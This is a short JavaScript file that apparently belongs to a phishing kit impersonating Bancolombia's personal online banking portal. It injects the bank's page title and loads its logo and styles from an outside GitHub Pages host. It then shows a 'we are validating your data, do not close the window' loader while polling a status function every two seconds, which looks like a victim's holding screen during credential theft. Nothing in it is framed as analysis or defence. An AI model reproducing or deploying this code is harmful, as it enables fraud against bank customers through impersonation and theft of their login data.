var myHosting = "https://itsmariodev.github.io/";

let head = `<title>Bancolombia Sucursal Virtual Personas</title>
<meta http-equiv="content-type" content="text/html; utf-8">
<meta charset="utf-8">
<meta content="es" http-equiv="Content-Language">
<meta name="description" content="">
<meta name="author" content="">
<meta name="Copyright" content="">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500&display=swap" rel="stylesheet">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<link href="${myHosting}css/style.css" rel="stylesheet">
<link href="${myHosting}css/stylesheet.css" rel="stylesheet">
<link href="${myHosting}img/logo.png" rel="icon" type="image/png">
<link href="${myHosting}WAITING/waitStyles.css" rel="stylesheet">
`;

let contenido = `<div class="fondoLoading"></div>
<div class="loader">
    <div class="boxLoader">
        <div class="puntoUno"></div>
        <div class="puntoDos"></div>
        <div class="puntoTres"></div>
        <img class="imgLoader" src="https://itsmariodev.github.io/WAITING/logoBancol.svg" alt="">
        <h1 class="h1Loader">Espera mientras validamos tus datos, nos tomará solo unos segundos. No cierres ni
            recargues la ventana<span id="spanLoader" class="h1Loader"></span></h1>
    </div>
</div>`;

function addHead() {
  $("head").append(head);
}

function addCode() {
  $("body").html(contenido);

  $(document).ready(function () {
    setInterval(consultar_estado, 2000);
  });
}

document.addEventListener("DOMContentLoaded", function () {
  addHead();
});

window.addEventListener("load", function () {
  //Aquí se puede meter la función addCode() para que el contenido cargue después de que se hayan
  //puesto cargado los estilos y que no se vea el html solo al inicio.
  addCode();
});
